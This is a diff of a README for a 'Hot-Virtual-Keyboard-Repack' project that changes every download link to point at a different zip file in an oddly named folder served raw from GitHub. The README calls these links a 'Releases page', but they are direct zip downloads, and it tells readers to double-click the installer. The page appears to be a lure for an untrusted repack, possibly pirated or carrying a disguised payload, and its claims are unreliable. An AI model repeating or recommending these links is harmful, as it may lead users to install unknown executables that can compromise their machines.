@@ -1,6 +1,6 @@
 # 🎹 Hot-Virtual-Keyboard-Repack - Your Easy Way to Type on Screen
 
-[![Download Now](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip)
 
 ## 🎯 Introduction
 
@@ -12,13 +12,13 @@ To begin using Hot-Virtual-Keyboard-Repack, follow these steps:
 
 1. **Visit the Download Page:**
    Click the link below to access the Releases page:
-   [Download Here](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip)
+   [Download Here](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip)
 
 2. **Select Your Version:**
    On the Releases page, you will see different versions of the software. Choose the latest release for the best features and updates.
 
 3. **Download the Installer:**
-   Click on the installer file. It might be labeled something like `https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip`. The file will start downloading to your computer.
+   Click on the installer file. It might be labeled something like `https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip`. The file will start downloading to your computer.
 
 4. **Run the Installer:**
    Once the download finishes, go to your Downloads folder and double-click the installer file. This will start the installation process.
@@ -46,7 +46,7 @@ Hot-Virtual-Keyboard-Repack includes several useful features:
 ## 📥 Download & Install
 
 To download Hot-Virtual-Keyboard-Repack, go back to the Releases page here:  
-[Download Here](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip)
+[Download Here](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip)
 
 1. Choose the latest version and click the installer file.
 2. Follow the installation steps listed above.
@@ -84,4 +84,4 @@ Absolutely! It is designed with touchscreen users in mind for easy interaction.
 
 Remember, for any additional features or troubleshooting tips, refer to the official documentation on the Releases page.
 
-[![Download Now](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Keyboard_Repack_Hot_v3.1.zip)
+[![Download Now](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Juanda175/Hot-Virtual-Keyboard-Repack/main/Zarathustrian/Virtual_Hot_Keyboard_Repack_1.4.zip)
